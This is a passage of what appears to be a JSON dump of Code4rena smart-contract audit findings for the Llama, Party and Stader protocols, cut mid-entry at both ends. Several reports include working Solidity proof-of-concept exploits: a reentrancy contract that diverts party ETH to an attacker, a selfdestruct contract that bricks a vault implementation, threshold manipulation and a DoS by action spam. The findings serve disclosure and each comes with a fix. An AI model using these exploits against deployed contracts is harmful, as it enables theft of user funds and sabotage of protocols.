`LlamaPolicy._setRoleHolder`, this in turn will first call function `_assertNoActionCreationsAtCurrentTimestamp`: ``` /// @dev Because role supplies are not checkpointed for simplicity, the following issue can occur   /// if each of the below is executed within the same timestamp:   //    1. An action is created that saves off the current role supply.   //    2. A policyholder is given a new role.   //    3. Now the total supply in that block is different than what it was at action creation.   // As a result, we disallow changes to roles if an action was created in the same block.   function _assertNoActionCreationsAtCurrentTimestamp() internal view {     if (llamaExecutor == address(0)) return; // Skip check during initialization.     address llamaCore = LlamaExecutor(llamaExecutor).LLAMA_CORE();     uint256 lastActionCreation = LlamaCore(llamaCore).getLastActionTimestamp();     if (lastActionCreation == block.timestamp) revert ActionCreationAtSameTimestamp();   } ```  As stated in the comment, the protocol disallows changes to roles if an action was created in the same block. However, function `LlamaCore._createAction` does not limit the number of actions a user could create. Consequently, a user with createAction role can DOS protocol's policy by creating large amount of actions. A user can create 24 * 3600 * 30 ~ 2.5 mils actions to DOS a system in a month, this is definitely a not too big number, especially when the protocol is deployed in low fee blockchains. (I notice that the folder `script` is organized as `script/input/{blockchainId}/*.json` so I assume that the protocol will be used across different blockchains).   This will prevents the revoking of expired roles, revoke policy,... because they all use `_setRoleHolder` function. Below is a POC, for ease of testing, place this test case under file LlamaStrategy.t.sol, contract IsActionApproved:  ``` function testDOSByCreatingManyAction() public {     ILlamaStrategy testStrategy = deployTestStrategy();     uint256 numberOfHolders = 10;     generateAndSetRoleHolders(numberOfHolders);      // create action     bytes32 newPermissionId = keccak256(abi.encode(address(mockProtocol), PAUSE_SELECTOR, testStrategy));     vm.prank(address(mpExecutor));     mpPolicy.setRolePermission(uint8(Roles.ActionCreator), newPermissionId, true);     bytes memory data = abi.encodeCall(MockProtocol.pause, (true));     vm.prank(actionCreatorAaron);     uint256 actionId = mpCore.createAction(uint8(Roles.ActionCreator), testStrategy, address(mockProtocol), 0, data, \"\");     console.logUint(actionId);     // revert if we try to set role     vm.prank(address(mpExecutor));     vm.expectRevert(LlamaPolicy.ActionCreationAtSameTimestamp.selector);     mpPolicy.setRoleHolder(uint8(Roles.TestRole1), address(12345), 1, type(uint64).max);       // Pass time     vm.warp(block.timestamp + 1);      // Create action again     vm.prank(actionCreatorAaron);     actionId = mpCore.createAction(uint8(Roles.ActionCreator), testStrategy, address(mockProtocol), 0, data, \"\");     console.logUint(actionId);     // policy can't set role again     vm.prank(address(mpExecutor));     vm.expectRevert(LlamaPolicy.ActionCreationAtSameTimestamp.selector);     mpPolicy.setRoleHolder(uint8(Roles.TestRole1), address(12345), 1, type(uint64).max);     } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps I recommend limiting the number of active actions a user can create.         ## Assessed type  DoS"}, {"title": "Anyone can change approval/disapproval threshold for any action using LlamaRelativeQuorum strategy. ", "html_url": "https://github.com/code-423n4/2023-06-llama-findings/issues/62", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-02"], "target": "2023-06-llama-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-llama/blob/main/src/strategies/LlamaRelativeQuorum.sol#L199-#L210   # Vulnerability details  ## Impact Anyone can change approval/disapproval threshold for any action using LlamaRelativeQuorum strategy.   ## Proof of Concept When a new action is created with `LlamaRelativeQuorum` strategy, `LlamaCore` will call function `validateActionCreation` which is currently implemented as below: ``` function validateActionCreation(ActionInfo calldata actionInfo) external {     LlamaPolicy llamaPolicy = policy; // Reduce SLOADs.     uint256 approvalPolicySupply = llamaPolicy.getRoleSupplyAsNumberOfHolders(approvalRole);     if (approvalPolicySupply == 0) revert RoleHasZeroSupply(approvalRole);      uint256 disapprovalPolicySupply = llamaPolicy.getRoleSupplyAsNumberOfHolders(disapprovalRole);     if (disapprovalPolicySupply == 0) revert RoleHasZeroSupply(disapprovalRole);      // Save off the supplies to use for checking quorum.     actionApprovalSupply[actionInfo.id] = approvalPolicySupply;     actionDisapprovalSupply[actionInfo.id] = disapprovalPolicySupply;   } ```  The last 2 lines of code is to `Save off the supplies to use for checking quorum`. The 2 variables `actionApprovalSupply` and `actionDisapprovalSupply` are described as `Mapping of action ID to the supply of the approval/disapproval role at the time the action was created.` This means the strategy will save the total supply of approval/disapproval role at creation time and then use them to calculate the approval/disapproval threshold, which equals to (approval/disapproval percentage) * (total supply of approval/disapproval). However, since the function `validateActionCreation`'s scope is `external` and does not require any privilege to be called, any user can call this function and update the total supply of approval/disapproval role to the current timestamp and break the intention to keep total supply of approval/disapproval role `at the time the action was created`. This issue is highly critical because many Llama protocol's functions depend on these 2 variables to function as intended.  For example, if the total supply of approval role is 10 at the creation of action and the `minApprovalPct` = 100% - which means requires all policy holders to approve the action to pass it. If it then be casted 9 votes (1 vote short), the action's state is still Active (not approved yet). However, if 1 user is revoked their approval/role, anyone can call function `validateActionCreation` and update the required threshold to 9 votes and thus the action's state becomes Approved.  Below is a POC for the above example, for ease of testing, place this test case under file `LlamaStrategy.t.sol`, contract `IsActionApproved`: ``` function testAnyoneCanChangeActionApprovalSupply() public {     // Deploy a relative quorum strategy     uint256 numberOfHolders = 10;      // Assign 10 users role of TestRole1     for (uint256 i=0; i< numberOfHolders; i++){       address _policyHolder = address(uint160(i + 100));       if (mpPolicy.balanceOf(_policyHolder) == 0) {         vm.prank(address(mpExecutor));         mpPolicy.setRoleHolder(uint8(Roles.TestRole1), _policyHolder, 1, type(uint64).max);       }     }       // Create  a LlamaRelativeQuorum strategy     // in this minApprovalPct = 10_000 (meaning we require all 10 policyholders to approve)     LlamaRelativeQuorum.Config memory testStrategyData = LlamaRelativeQuorum.Config({       approvalPeriod: 2 days,       queuingPeriod: 2 days,       expirationPeriod: 8 days,       isFixedLengthApprovalPeriod: true,       minApprovalPct: 10000, // require all policyholder to approve       minDisapprovalPct: 2000,       approvalRole: uint8(Roles.TestRole1),       disapprovalRole: uint8(Roles.TestRole1),       forceApprovalRoles: new uint8[](0),       forceDisapprovalRoles: new uint8[](0)     });      ILlamaStrategy testStrategy = lens.computeLlamaStrategyAddress(       address(relativeQuorumLogic), DeployUtils.encodeStrategy(testStrategyData), address(mpCore)     );      LlamaRelativeQuorum.Config[] memory testStrategies     = new LlamaRelativeQuorum.Config[](1);     testStrategies[0] = testStrategyData;     vm.prank(address(mpExecutor));     mpCore.createStrategies(relativeQuorumLogic, DeployUtils.encodeStrategyConfigs(testStrategies));      // create action     ActionInfo memory actionInfo = createAction(testStrategy);     assertEq(LlamaRelativeQuorum(address(testStrategy)).actionApprovalSupply(actionInfo.id), numberOfHolders);      // Suppose that 9 policyholder approve     // the action lacks 1 more approval vote so isActionApproved = false     approveAction(9, actionInfo);     assertEq(LlamaRelativeQuorum(address(testStrategy)).isActionApproved(actionInfo), false);      // Revoke 1 user     vm.prank(address(mpExecutor));     mpPolicy.revokePolicy(address(100));      // Now anyone can update the actionApprovalSupply and therefore     // change the approval threshold     address anyOne = address(12345);     vm.prank(anyOne);     LlamaRelativeQuorum(address(testStrategy)).validateActionCreation(actionInfo);      // The actionApproval for the above action is reduced to 9     // and the action state changes to approved     assertEq(LlamaRelativeQuorum(address(testStrategy)).actionApprovalSupply(actionInfo.id), numberOfHolders - 1);     assertEq(LlamaRelativeQuorum(address(testStrategy)).isActionApproved(actionInfo), true);   } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps Since the intention is to keep values `actionApprovalSupply` and `actionDisapprovalSupply` snapshot at creation time for every action and `LlamaCore` only call `validateActionCreation` at creation time, I think the easiest way is to allow only `llamaCore` to call this function.            ## Assessed type  Access Control"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-party-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "sponsor confirmed", "G-02"], "target": "2023-05-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-party-findings/blob/main/data/adriro-G.md)."}, {"title": "Reentrancy guard in `rageQuit()` can be bypassed", "html_url": "https://github.com/code-423n4/2023-05-party-findings/issues/13", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-05-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-party/blob/main/contracts/party/PartyGovernanceNFT.sol#L293-L353   # Vulnerability details  # Reentrancy guard in `rageQuit()` can be bypassed  The reentrancy guard present in the `rageQuit()` function can be bypassed by host accounts, leading to reentrancy attack vectors and loss of funds.  ## Impact  The new `rageQuit()` function can be used by party members to exit their position and obtain their share of the tokens held by the party contract. In order to prevent function reentrancy while sending ETH or transferring ERC20 tokens, the implementation reuses the `rageQuitTimestamp` variable as a guard to check if the function is being called again while executing.  https://github.com/code-423n4/2023-05-party/blob/main/contracts/party/PartyGovernanceNFT.sol#L293-L353  ```solidity 293:     function rageQuit( 294:         uint256[] calldata tokenIds, 295:         IERC20[] calldata withdrawTokens, 296:         address receiver 297:     ) external { 298:         // Check if ragequit is allowed. 299:         uint40 currentRageQuitTimestamp = rageQuitTimestamp; 300:         if (currentRageQuitTimestamp != ENABLE_RAGEQUIT_PERMANENTLY) { 301:             if ( 302:                 currentRageQuitTimestamp == DISABLE_RAGEQUIT_PERMANENTLY || 303:                 currentRageQuitTimestamp < block.timestamp 304:             ) { 305:                 revert CannotRageQuitError(currentRageQuitTimestamp); 306:             } 307:         } 308:  309:         // Used as a reentrancy guard. Will be updated back after ragequit. 310:         delete rageQuitTimestamp;                            ...               349:         // Update ragequit timestamp back to before. 350:         rageQuitTimestamp = currentRageQuitTimestamp; 351:  352:         emit RageQuit(tokenIds, withdrawTokens, receiver); 353:     } ```  The implementation deletes the value of `rageQuitTimestamp` (which sets it to zero) in line 310. The intention is to use this variable to prevent reentrancy, as setting it to zero will block any call due to the check in line 303, `block.timestamp` will be greater than zero and will lead to the revert in line 305. After NFTs are burned and tokens are transferred, the function restores the original value in line 350.  This reentrancy guard can still be bypassed using `setRageQuit()`. If execution control is transferred to the attacker, then the attacker can call `setRageQuit()` to reset the value to anything greater than `block.timestamp`, allowing the reentrancy on the `rageQuit()` function. Note that this would require the attacker to be a party host or be in complicity with a party host.  The general scenario to trigger the reentrancy is as follows:  1. User calls `rageQuit()`. 2. ETH or ERC20 transfers control to the attacker. This can be in different forms:    - ETH transfers to contracts that invoke the `receive()` or `fallback()` function.    - Variations of the ERC20 tokens that have callbacks during transfers (e.g. ERC777)    - Poisoned ERC20 implementation that receives control during the `transfer()` call itself. 3. Attacker resets the `rageQuitTimestamp` by calling `setRageQuit(block.timestamp + 1)`. 4. Attacker reenters the `rageQuit()` function.  The issue can be exploited to disable the reentrancy guard in the `rageQuit()` function, leading to further attacks. We will explore a scenario of potential loss of funds in the next section.  ## Proof of Concept  The following is an adaptation of the test `testRageQuit_cannotReenter()` present in the PartyGovernanceNFT.t.sol test suite, with minimal variations to enable the described attack.  Note: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/9a9868c7c3f540811eff6853db14bfc6).  ```solidity function test_PartyGovernanceNFT_ReentrancyAttack() external {    address alice = makeAddr(\"alice\");    address host = makeAddr(\"host\");     (Party party, , ) = partyAdmin.createParty(       partyImpl,       PartyAdmin.PartyCreationMinimalOptions({             host1: address(this),             host2: host,             passThresholdBps: 5100,             totalVotingPower: 100,             preciousTokenAddress: address(toadz),             preciousTokenId: 1,             rageQuitTimestamp: 0,             feeBps: 0,             feeRecipient: payable(0)       })    );     vm.prank(address(this));    party.setRageQuit(uint40(block.timestamp) + 1);     // Mint voting NFTs, alice and host have both 50%    vm.prank(address(partyAdmin));    uint256 aliceTokenId = party.mint(alice, 50, alice);    vm.prank(address(partyAdmin));    uint256 hostTokenId = party.mint(host, 50, host);     // Host (attacker) deploys malicious ReenteringContract    ReenteringContract reenteringContract = new ReenteringContract(party, hostTokenId, host);     // Host sends his NFT to the contract    vm.prank(host);    party.transferFrom(host, address(reenteringContract), hostTokenId);     // Host transfer host feature to contract    vm.prank(host);    party.abdicateHost(address(reenteringContract));     // Simulate there is 1 ETH in the party    vm.deal(address(party), 1 ether);     // Alice decides to rage quit     IERC20[] memory tokens = new IERC20[](2);    tokens[0] = IERC20(address(reenteringContract));    tokens[1] = IERC20(ETH_ADDRESS);     uint256[] memory tokenIds = new uint256[](1);    tokenIds[0] = aliceTokenId;     vm.prank(alice);    party.rageQuit(tokenIds, tokens, alice);     // Alice has 0 ETH while the host (attacker) has all the funds    assertEq(alice.balance, 0);    assertEq(host.balance, 1 ether); }  contract ReenteringContract is ERC721Receiver {     Party party;     uint256 tokenId;     address attacker;      constructor(Party _party, uint256 _tokenId, address _attacker) {         party = _party;         tokenId = _tokenId;         attacker = _attacker;     }      function balanceOf(address) external returns (uint256) {         return 1337;     }      function transfer(address, uint256) external returns (bool) {         // Disable reentrancy guard         party.setRageQuit(uint40(block.timestamp + 1));          // Return host to attacker         party.abdicateHost(attacker);          // Execute attack         IERC20[] memory tokens = new IERC20[](1);         tokens[0] = IERC20(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);         uint256[] memory tokenIds = new uint256[](1);         tokenIds[0] = tokenId;         party.rageQuit(tokenIds, tokens, address(this));         return true;     }      fallback() external payable {         // sends funds to attacker         payable(attacker).transfer(address(this).balance);     } } ```  ## Recommendation  Implement a reentrancy guard using a dedicated variable that acts as the flag, such as the one available in the [OpenZeppelin contracts library](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard).  Alternatively, if the intention is to reuse the same `rageQuitTimestamp` variable, set it temporarily to  `DISABLE_RAGEQUIT_PERMANENTLY` instead of zero. This will prevent calling `setRageQuit()` to reset the `rageQuitTimestamp` variable while also blocking calls to `rageQuit()`.    ## Assessed type  Reentrancy"}, {"title": "Users can bypass distributions fees by ragequitting instead of using a formal distribution", "html_url": "https://github.com/code-423n4/2023-05-party-findings/issues/12", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-05-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/party/PartyGovernanceNFT.sol#L293-L347   # Vulnerability details  ## Impact  Distribution fees can be bypassed by ragequitting instead of distributing  ## Proof of Concept  https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/party/PartyGovernance.sol#L510-L515          address payable feeRecipient_ = feeRecipient;         uint16 feeBps_ = feeBps;         if (tokenType == ITokenDistributor.TokenType.Native) {             return                 distributor.createNativeDistribution{ value: amount }(this, feeRecipient_, feeBps_);         }  When a distribution is created the distribution will pay fees to the feeRecipient.  https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/party/PartyGovernanceNFT.sol#L333-L345                  if (address(token) == ETH_ADDRESS) {                     // Transfer fair share of ETH to receiver.                     uint256 amount = (address(this).balance * shareOfVotingPower) / 1e18;                     if (amount != 0) {                         payable(receiver).transferEth(amount);                     }                 } else {                     // Transfer fair share of tokens to receiver.                     uint256 amount = (token.balanceOf(address(this)) * shareOfVotingPower) / 1e18;                     if (amount != 0) {                         token.compatTransfer(receiver, amount);                     }                 }  On the other hand, when a user ragequits they are given the full amount without any fees being taken. If we assume that the party is winding down then users can bypass this fee by ragequitting instead of using a formal distribution. This creates value leakage at the fee recipient is not being paid the fees they would otherwise be due.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Charge distribution fees when ragequitting   ## Assessed type  Other"}, {"title": "The distribution logic will be broken after calling `rageQuit()`", "html_url": "https://github.com/code-423n4/2023-05-party-findings/issues/6", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-05-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/party/PartyGovernanceNFT.sol#L150   # Vulnerability details  ## Impact Malicious users might receive more distributed funds than they should with higher `distributionShare`.  ## Proof of Concept In `PartyGovernanceNFT.sol`, there is a `getDistributionShareOf()` function to calculate the distribution share of party NFT.  ```solidity     function getDistributionShareOf(uint256 tokenId) public view returns (uint256) {         uint256 totalVotingPower = _governanceValues.totalVotingPower;          if (totalVotingPower == 0) {             return 0;         } else {             return (votingPowerByTokenId[tokenId] * 1e18) / totalVotingPower;         }     } ```  This function is used to calculate the claimable amount in [getClaimAmount()](https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/distribution/TokenDistributor.sol#L234).  ```solidity     function getClaimAmount(         ITokenDistributorParty party,         uint256 memberSupply,         uint256 partyTokenId     ) public view returns (uint128) {         // getDistributionShareOf() is the fraction of the memberSupply partyTokenId         // is entitled to, scaled by 1e18.         // We round up here to prevent dust amounts getting trapped in this contract.         return             ((uint256(party.getDistributionShareOf(partyTokenId)) * memberSupply + (1e18 - 1)) /                 1e18).safeCastUint256ToUint128();     } ```  So after the party distributed funds by executing the distribution proposal, users can claim relevant amounts of funds using their party NFTs.  After the update, `rageQuit()` was added so that users can burn their party NFTs while taking their share of the party's funds.  So the below scenario would be possible. 1. Let's assume `totalVotingPower = 300` and the party has 3 party NFTs of 100 voting power. And `Alice` has 2 NFTs and `Bob` has 1 NFT. 2. They proposed a distribution proposal and executed it. Let's assume the party transferred 3 ether to the distributor. 3. They can claim the funds by calling [TokenDistributor.claim()](https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/distribution/TokenDistributor.sol#L138) and `Alice` should receive 2 ether and 1 ether for `Bob`.(We ignore the distribution fee.) 4. But `Alice` decided to steal `Bob`'s funds so she claimed the distributed funds(3 / 3 = 1 ether) with the first NFT and called `rageQuit()` to take her share of the party's remaining funds. 5. After that, `Alice` calls `claim()` with the second NFT ,and `getDistributionShareOf()` will return 50% as the total voting power was decreased to 200. So `Alice` will receive `3 * 50% = 1.5 ether` and `Bob` will receive only 0.5 ether because of this [validation](https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/distribution/TokenDistributor.sol#L167) 6. After all, `Alice` received 2.5 ether instead of 2 ether.  Even if `rageQuit` is disabled, `Alice` can burn using `burn()` her NFT directly if her share of the party's remaining funds are less than the stolen funds from `Bob`.  Here is a simple POC showing the distribution shares after `rageQuit()`.  ```solidity     function testWrongDistributionSharesAfterRageQuit() external {         (Party party, , ) = partyAdmin.createParty(             partyImpl,             PartyAdmin.PartyCreationMinimalOptions({                 host1: address(this),                 host2: address(0),                 passThresholdBps: 5100,                 totalVotingPower: 300,                 preciousTokenAddress: address(toadz),                 preciousTokenId: 1,                 rageQuitTimestamp: 0,                 feeBps: 0,                 feeRecipient: payable(0)             })         );          vm.prank(address(this));         party.setRageQuit(uint40(block.timestamp) + 1);          address user1 = _randomAddress();         address user2 = _randomAddress();         address user3 = _randomAddress();          //3 users have the same voting power         vm.prank(address(partyAdmin));         uint256 tokenId1 = party.mint(user1, 100, user1);          vm.prank(address(partyAdmin));         uint256 tokenId2 = party.mint(user2, 100, user2);          vm.prank(address(partyAdmin));         uint256 tokenId3 = party.mint(user3, 100, user3);          vm.deal(address(party), 1 ether);          // Before calling rageQuit(), each user has the same 33.3333% shares         uint256 expectedShareBeforeRageQuit = uint256(100) * 1e18 / 300;         assertEq(party.getDistributionShareOf(tokenId1), expectedShareBeforeRageQuit);         assertEq(party.getDistributionShareOf(tokenId2), expectedShareBeforeRageQuit);         assertEq(party.getDistributionShareOf(tokenId3), expectedShareBeforeRageQuit);          IERC20[] memory tokens = new IERC20[](1);         tokens[0] = IERC20(ETH_ADDRESS);         uint256[] memory tokenIds = new uint256[](1);         tokenIds[0] = tokenId1;          vm.prank(user1);         party.rageQuit(tokenIds, tokens, user1);          // After calling rageQuit() by one user, the second user has 50% shares and can claim more distribution         uint256 expectedShareAfterRageQuit = uint256(100) * 1e18 / 200;         assertEq(party.getDistributionShareOf(tokenId2), expectedShareAfterRageQuit);     } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps I think we shouldn't use `getDistributionShareOf()` for distribution shares.  Instead, we should remember `totalVotingPower` for each distribution separately in [_createDistribution()](https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/distribution/TokenDistributor.sol#L310) so that each user can receive correct funds even after some NFTs are burnt.   ## Assessed type  Governance"}, {"title": "`VaultProxy` implementation can be initialized by anyone and self-destructed", "html_url": "https://github.com/code-423n4/2023-06-stader-findings/issues/418", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-06-stader-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-stader/blob/7566b5a35f32ebd55d3578b8bd05c038feb7d9cc/contracts/VaultProxy.sol#L20-L36 https://github.com/code-423n4/2023-06-stader/blob/7566b5a35f32ebd55d3578b8bd05c038feb7d9cc/contracts/VaultProxy.sol#L41-L50   # Vulnerability details  ## Impact When the `VaultFactory` contract is deployed and initialized, the `initialise` method on the newly created `VaultProxy` implementation contract is never called. As such, anyone can call that method and pass in whatever values they want as arguments. One important argument is the `_staderConfig` address, which controls where the `fallback` function will direct `delegatecall` operations. If an attacker passes in a contract that calls `selfdestruct` it will be run in the context of the `VaultProxy` implementation contract, and will erase all code from that address. Since the clones from the VaultProxy contract merely delegate calls to the implementation address, all subsequent calls for all created vaults from that implementation, will be treated like an EOA and return `true` even though calls to functions on that proxy were never executed.  ## Proof of Concept - First, an attacker deploys a contract called `AttackContract` that calls `selfdestruct` in its `fallback` function. ``` contract AttackContract {     function getValidatorWithdrawalVaultImplementation() public view returns(address) {         return address(this);     }     function getNodeELRewardVaultImplementation() public view returns(address) {  return address(this);     }     fallback(bytes calldata _input) external payable returns(bytes memory _output) {  selfdestruct(address(0));     } } ``` - The attacker calls the `initialise` method on the `VaultProxy` implementation contract. That address is stored in the `vaultProxyImplementation` variable on the `VaultFactory` contract. The attacker passes in the address of `AttackContract` as the `_staderConfig` argument for the `initialise` function. - The attacker then calls a non-existent function on the `VaultProxy` implementation contract, which triggers it's `fallback` function. The `fallback` function calls `staderConfig.getNodeELRewardVaultImplementation()`, and since `staderConfig` is set the `AttackContract` address, it returns the address of the `AttackContract`. `delegatecall` runs the fallback function of `AttackContract` in its own execution environment. `selfdestruct` is called in the execution environment of the `VaultProxy` implementation, which erases the code at that address. - All cloned copies of the `VaultProxy` implementation contract are now forwarding calls to an implementation address that has no code stored at it. These calls will be treated like calls to an EOA and return `true` for `success`.  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps Prevent the `initialise` function from being called on the `VaultProxy` implementation contract by inheriting from OpenZeppelin's `Initializable` contract, like the system is doing in other contracts. Call the `_disableInitializers` function in the constructor and protect `initialise` with the `initializer` modifier. Alternatively, the `initialise` function can be called from the `initialize` function of the `VaultFactory` contract when the `VaultProxy` contract is instantiated.   ## Assessed type  Access Control"}, {"title": "Risk of losing admin access if updateAdmin set with same current admin address", "html_url": "https://github.com/code-423n4/2023-06-stader-findings/issues/390", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-06-stader-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-stader/blob/7566b5a35f32ebd55d3578b8bd05c038feb7d9cc/contracts/StaderConfig.sol#L176-L183   # Vulnerability details  > N.B : This bug is different that the other one titled \"The admin address used in initialize function, can behave maliciously\". Both issues are related to access control, but the impact, root cause and bug fix are different, so DO NOT mark it as dupliate of the other one.   Current admin will lose DEFAULT_ADMIN_ROLE role if updateAdmin issued with same address.   ## Impact The is a possibility of loss of protocol admin access to this critical StaderConfig.sol contract, if updateAdmin() is set with same current admin address by mistake.   ## Proof of Concept Contract : StaderConfig.sol Function : function updateAdmin(address _admin)  Using Brownie python automation framework commands in below examples.   * Step#1 After initialization, admin-A is the admin which has the DEFAULT_ADMIN_ROLE  * Step#2 update new Admin   StaderConfig.updateAdmin(admin-B, {'from':admin-A})   The value of StaderConfig.getAdmin() is admin-B  * Step#3 admin-B updates admin to itself again   StaderConfig.updateAdmin(admin-B, {'from':admin-B})   The value of StaderConfig.getAdmin() is admin-B, but the DEFAULT_ADMIN_ROLE is revoked due to _revokeRole(DEFAULT_ADMIN_ROLE, oldAdmin);   Now the protocol admin control is lost for StaderConfig contract   ## Recommended Mitigation Steps Ref : https://github.com/code-423n4/2023-06-stader/blob/7566b5a35f32ebd55d3578b8bd05c038feb7d9cc/contracts/StaderConfig.sol#L177 In the updateAdmin() function, add a check for oldAdmin != _admin , like below ```     address oldAdmin = accountsMap[ADMIN]; +   require(oldAdmin != _admin, \"Already set to admin\");   ## Assessed type  Access Control"}, {"title": "`pause/unpause` functionnalities not implemented in many pausable contracts", "html_url": "https://github.com/code-423n4/2023-06-stader-findings/issues/383", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-06-stader-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-stader/blob/main/contracts/SocializingPool.sol#L21 https://github.com/code-423n4/2023-06-stader/blob/main/contracts/Auction.sol#L14 https://github.com/code-423n4/2023-06-stader/blob/main/contracts/StaderOracle.sol#L17 https://github.com/code-423n4/2023-06-stader/blob/main/contracts/OperatorRewardsCollector.sol#L16   # Vulnerability details  ## Impact  The following contracts : `SocializingPool`, `StaderOracle`, `OperatorRewardsCollector` and `Auction` are supposed to be pausable (as they all inherit from `PausableUpgradeable`) but they don't implement the external `pause/unpause` functionalities which means it will never be possible to pause them.  ## Proof of Concept  All the following contracts `SocializingPool`, `StaderOracle`, `OperatorRewardsCollector` and `Auction` inherit from the openzeppelin `PausableUpgradeable` extension which means that they contain internal functions `_pause` and `_unpause`.  Because those function are internal, the contract must implement two other public/external `pause` and `unpause` functions to allow the manager to pause and unpause the contracts when necessary, but none of the aforementioned contracts implement those functions which means that even if those contracts are supposed to be pausable (have the `pause/unpause` functionalities) none of them can be paused.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Add public/external `pause` and `unpause` functions in the aforementioned contracts to allow them to be pausable, this can be done just as in the `UserWithdrawalManager` contract for example :  ```solidity /**  * @dev Triggers stopped state.  * Contract must not be paused  */ function pause() external {     UtilLib.onlyManagerRole(msg.sender, staderConfig);     _pause(); }  /**  * @dev Returns to normal state.  * Contract must be paused  */ function unpause() external onlyRole(DEFAULT_ADMIN_ROLE) {     _unpause(); } ```   ## Assessed type  Other"}, {"title": "Stader OPERATOR is single point of failure", "html_url": "https://github.com/code-423n4/2023-06-stader-findings/issues/344", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-06-stader-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-stader/blob/main/contracts/PermissionlessNodeRegistry.sol#L183 https://github.com/code-423n4/2023-06-stader/blob/main/contracts/PermissionedNodeRegistry.sol#L254   # Vulnerability details  ## Impact The OPERATOR role holds a lot of power within the system, which can compromise the both the system integrity and it's permission-less nature.   ## Proof of Concept The OPERATOR key is responsible for confirming marking each validator submitted key as either valid or invalid, without any assurance to validators.   1. Arbitrary negation of participation makes permissionless pool permissioned. The documentation states:   > Any validator in permissionless pool can run a node with 4 ETH + 0.4 ETH worth of SD token.  Which is not strictly true, since any participant in the system must be vetted by the OPERATOR, which can arbitrarily mark as invalid or frontrun key without the need to provide justification or having an appeal system. Alternatively, the OPERATOR can simple ignore the added key and never mark it as `ready to deposit`.   Therefore, the pool can't be considered permissionless, since participants must rely on the benevolence of the OPERATOR to participate.   2. Authorization of invalid keys There is no way for the smart contract system to check or confirm that a given public key is really legit, and could generate income to ETHx holders, so the system relies solely on the OPERATOR to make that distinction, rendering the system vulnerable in case of a comprised wallet.   ## Tools Used Manual Review  ## Recommended Mitigation Steps There is no simple fix for the issue, but at minimum, the protocol shouldn't be advertised as permissioneless.   ## Assessed type  Rug-Pull"}, {"title": "`updatePoolAddress` functions always reverts when updating existing poolId", "html_url": "https://github.com/code-423n4/2023-06-stader-findings/issues/341", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-06-stader-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-stader/blob/main/contracts/PoolUtils.sol#L55-L65   # Vulnerability details   ## Impact  The purpose of the `updatePoolAddress` function is to update the pool address associated with an existing poolId. However, due to its internal invocation of the `verifyNewPool` function, the `updatePoolAddress` function always reverts, this occurs because the `verifyNewPool` function itself reverts when the specified poolId already exists. Consequently, it is not possible to update the pool address for an existing poolId.  ## Proof of Concept  The issue occurs in the `updatePoolAddress` function below :   File: PoolUtils.sol [Line 55-65](https://github.com/code-423n4/2023-06-stader/blob/main/contracts/PoolUtils.sol#L55-L65)  ```solidity function updatePoolAddress(     uint8 _poolId,     address _newPoolAddress ) external override onlyExistingPoolId(_poolId) onlyRole(DEFAULT_ADMIN_ROLE) {     UtilLib.checkNonZeroAddress(_newPoolAddress);     // @audit always revert on exsiting poolId     verifyNewPool(_poolId, _newPoolAddress);      poolAddressById[_poolId] = _newPoolAddress;     emit PoolAddressUpdated(_poolId, _newPoolAddress); } ```  As it can be seen from the code above, the `updatePoolAddress` function contains the `onlyExistingPoolId` modifier which means it can only be called for updating the pool address of an already exiting poolId.   Before updating the pool address the `updatePoolAddress` function calls the `verifyNewPool` function below : ```solidity function verifyNewPool(uint8 _poolId, address _poolAddress) internal view {     if (         